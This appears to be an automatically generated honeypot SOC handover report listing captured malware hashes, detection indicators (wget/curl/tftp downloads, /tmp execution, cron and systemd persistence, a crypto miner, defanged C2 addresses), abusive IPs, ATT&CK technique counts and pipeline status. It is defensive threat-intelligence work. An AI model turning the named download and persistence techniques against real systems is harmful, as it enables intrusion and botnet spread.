| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `189.190.168[.]131` | MX | Gestión de direccionamiento UniNet | **100** ⚠️ | 18 |
| `103.216.145[.]2` | IN | Facts Online Pvt Ltd | **100** ⚠️ | 50 |
| `13.218.153[.]179` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 23 |
| `122.188.208[.]21` | CN | UNICOM Hubei Province Network | **100** ⚠️ | 5 |
| `58.221.60[.]25` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `191.101.96[.]217` | PA | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 1 |
| `20.184.59[.]236` | SG | Microsoft Corporation | **100** ⚠️ | 0 |
| `58.20.236[.]52` | CN | CNC Group HuNan JiShou network | **100** ⚠️ | 50 |
| `50.6.243[.]128` | CA | Newfold Digital, Inc. | **100** ⚠️ | 2 |
| `165.165.118[.]193` | ZA | Telkom SA Limited | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 544 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 480 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 240 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 182 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 67 |

---

## 🔕 False Positive Summary (92 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 1 below threshold 25 | 4 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 10 |
| AbuseIPDB score 14 below threshold 25 | 9 |
| AbuseIPDB score 15 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 6 |
| AbuseIPDB score 20 below threshold 25 | 4 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 747 cases |
| Tool 34  | Credential Extractor        | ✅ 5037 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 33 fingerprints |
| Tool 36  | Command Clustering          | ✅ 77 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 396 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 92 filtered (12.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 168 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 471 priority case(s) shown individually · 164 recon entry/entries in table (12 group(s) consolidating 32 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-28T17:39:07Z_
